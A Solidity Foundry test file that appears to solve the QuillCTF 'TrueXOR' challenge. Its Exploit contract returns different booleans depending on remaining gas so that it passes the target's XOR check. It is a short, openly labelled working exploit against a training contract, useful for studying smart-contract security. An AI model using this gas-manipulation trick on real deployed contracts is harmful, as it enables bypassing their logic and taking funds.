// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/TrueXOR.sol";

contract TrueXORTest is Test {
    TrueXOR public trueXOR;
    Exploit public exploit;
    address public deployer;
    address public attacker;

    function setUp() public {
        deployer = vm.addr(1); 
        attacker = vm.addr(2);
        vm.deal(attacker, 0.01 ether);

        vm.startPrank(deployer);
        trueXOR = new TrueXOR();
        vm.stopPrank();

        vm.startPrank(attacker);
        exploit = new Exploit(trueXOR);
        vm.stopPrank();
    }

    function testTrueXORExploit() public {   
        // Exploit
        vm.startPrank(attacker, attacker);
        trueXOR.callMe(address(exploit));
        vm.stopPrank();
    }
}

contract Exploit {
    TrueXOR public trueXOR;

    constructor(TrueXOR _trueXOR) payable {
        trueXOR = _trueXOR;
    }

    function giveBool() external view returns (bool) {
        console.log("gasleft(): ", gasleft());
        if (gasleft() > 8937393460516710356) {
            return true;
        } else {
            return false;
        }
    }
}